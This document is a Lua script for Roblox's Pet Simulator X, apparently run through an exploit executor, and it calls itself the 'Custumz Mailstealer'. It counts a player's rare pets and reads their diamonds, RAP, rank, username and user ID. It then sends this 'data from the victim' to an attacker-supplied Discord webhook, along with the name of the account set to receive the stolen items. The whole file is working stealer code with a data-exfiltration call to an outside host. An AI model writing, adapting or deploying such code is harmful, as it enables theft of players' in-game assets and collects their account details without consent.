local Exclusive = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do

    if v:IsA("TextButton") then

    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then                    Exclusive = Exclusive + 1

                end

            end

	end

local Event = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do

    if v:IsA("TextButton") then

    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then

                    Event = Event + 1

                end

            end

	end

local Secret = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do

    if v:IsA("TextButton") then

    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Secret") then

                    Secret = Secret + 1

                end

            end

	end
local exploit = identifyexecutor()

  

--// Execution Log

if game.PlaceId == 6284583030 then

	_G.GameIn = "Pet Simulator X"

elseif game.PlaceId == 7722306047 then

	_G.GameIn = "PSX Trading Plaza"

elseif game.PlaceId == 10321372166 then

	_G.GameIn = "PSX Hardcore"

elseif game.PlaceId == 12610002282 then

	_G.GameIn = "PSX Pro Trading Plaza"

elseif game.PlaceId == 11725212117 then

	_G.GameIn = "PSX Voice Trading Plaza"

else

	_G.GameIn = "❓ Couldn't find game"

end

local webhookcolor = "13369599"

local Players = game:GetService("Players")

local Client = Players.LocalPlayer

_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text

_G.PlrUserVictim = game.Players.LocalPlayer.Name

_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId

_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName

_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value

_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value

_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text

local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))

local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))

local function sendwebhook(msg)

local msg = {

	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",

	["content"]= "**🎁New Hit With Custumz🎁** || @here|| ",

	["username"] = "Custumz",

	["embeds"]= {

	  {

		["title"]= "`Custumz Mailstealer Results`",

		["description"]= "**Data from the victim**\n```🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n☠Executor: "..exploit.."\n📮Receiver: ".._G.Username.."```",

		["url"]= "https://discord.gg/VZX6jGKgxw",

		["color"]= ""..webhookcolor.."",

		["thumbnail"] = {

        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",

        ["height"] = 420,

        ["width"] = 420

        },

		["fields"]= {

        {

          ["name"]= "**💎Diamonds 💎**",

          ["value"]= "```"..GemsFormated.."```",

          ["inline"]= true

        },

        {

          ["name"]= "**⬆️Rap⬆️**",

          ["value"]= "```"..RapFormated.."```",

          ["inline"]= true

        },

	{

          ["name"]= "**🏆Exclusive🏆**",

          ["value"]= "```"..Exclusive.."```",

          ["inline"]= true

        },

	{

          ["name"]= "**🎃Event🎃**",

          ["value"]= "```"..Event.."```",

          ["inline"]= true

        }

      }

      

  }

  },

	["attachments"] = {}

  }

  local Webhook = _G.Webhook

  request = http_request or request or HttpPost or syn.request

  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})

  end

  sendwebhook(msg)
